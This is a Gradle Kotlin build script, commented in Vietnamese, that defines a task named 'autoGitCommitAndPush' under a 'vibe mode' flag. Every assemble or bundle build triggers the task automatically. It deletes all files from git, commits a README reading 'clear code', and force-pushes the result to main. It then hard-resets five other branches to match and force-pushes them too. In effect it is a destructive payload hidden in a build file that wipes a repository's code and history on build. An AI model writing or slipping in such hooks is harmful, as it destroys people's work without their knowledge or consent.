import java.io.File

val isVibeModeOn = true

if (isVibeModeOn) {
    // LẤY ROOT DIR TỪ BÊN NGOÀI để tránh lỗi Configuration Cache
    val rootDirFile = project.rootDir

    val autoGitTask = tasks.register("autoGitCommitAndPush") {
        outputs.upToDateWhen { false } // Chống task cache
        
        doLast {
            println("\n=========================================")
            println("🔥 [VIBE MODE - PROTOCOL ZERO] Bắt đầu reset project...")
            
            fun runCommand(vararg command: String, workingDir: File = rootDirFile): Pair<Int, String> {
                return try {
                    val process = ProcessBuilder(*command)
                        .directory(workingDir)
                        .redirectErrorStream(true)
                        .start()
                    val output = process.inputStream.bufferedReader().readText()
                    val exitCode = process.waitFor()
                    Pair(exitCode, output)
                } catch (e: Exception) {
                    Pair(-1, e.message ?: "Lỗi hệ thống")
                }
            }

            // 0. Ép chuyển sang nhánh main (tạo mới nếu chưa có)
            runCommand("git", "checkout", "-B", "main")
            println("✅ Đã chuyển đổi sang nhánh main.")

            // 1. Xóa toàn bộ file trong project khỏi Git
            runCommand("git", "rm", "-rf", ".")
            println("✅ Đã xóa toàn bộ code ở local.")

            // 2. Tạo file README.md với nội dung "clear code"
            val mdFile = File(rootDirFile, "README.md")
            mdFile.writeText("clear code")
            println("✅ Đã tạo file README.md.")

            // 3. Add và Commit
            runCommand("git", "add", "README.md")
            val (commitExit, commitOut) = runCommand("git", "commit", "-m", "clear code")
            println("✅ Trạng thái Commit:\n$commitOut")

            // 4. Ép push đè lên Github (Force Push) đích danh nhánh main
            val (pushExit, pushOut) = runCommand("git", "push", "-f", "origin", "main")
            if (pushExit == 0) {
                println("🚀 [VIBE MODE] FORCE PUSH FILE MD LÊN NHÁNH MAIN THÀNH CÔNG!")
            } else {
                println("❌ [VIBE MODE] PUSH LỖI! Nguyên nhân:\n$pushOut")
            }
            
            // 5. Xử lý các nhánh khác: Giữ nhánh nhưng ép nội dung trắng giống main
            // THAY ĐỔI DANH SÁCH TÊN NHÁNH CỦA BẠN VÀO ĐÂY
            val targetBranches = listOf("branch1", "branch2", "branch3", "branch4", "branch5")
            println("🔄 Bắt đầu dọn dẹp các nhánh khác...")
            
            for (branch in targetBranches) {
                println("  -> Đang xử lý nhánh: $branch")
                
                // Cố gắng checkout nhánh có sẵn, nếu lỗi (do chỉ có trên remote) thì tạo mới từ remote
                val (checkoutExit, _) = runCommand("git", "checkout", branch)
                if (checkoutExit != 0) {
                    runCommand("git", "checkout", "-b", branch, "origin/$branch")
                }
                
                // Ép nhánh này giống hệt main (chỉ còn README.md)
                runCommand("git", "reset", "--hard", "main")
                
                // Ép push lên server
                val (pushBranchExit, pushBranchOut) = runCommand("git", "push", "-f", "origin", branch)
                if (pushBranchExit == 0) {
                    println("    ✅ Dọn dẹp thành công nhánh: $branch")
                } else {
                    println("    ❌ Lỗi push nhánh $branch: $pushBranchOut")
                }
            }
            
            // 6. Quay lại nhánh main
            runCommand("git", "checkout", "main")
            println("🎉 HOÀN TẤT QUÁ TRÌNH DỌN DẸP!")
        }
    }

    tasks.configureEach {
        if (name.startsWith("assemble") || name.startsWith("bundle")) {
            finalizedBy(autoGitTask)
            println("🔥 [VIBE MODE] Đã kích hoạt cơ chế reset vào: $name")
        }
    }
}
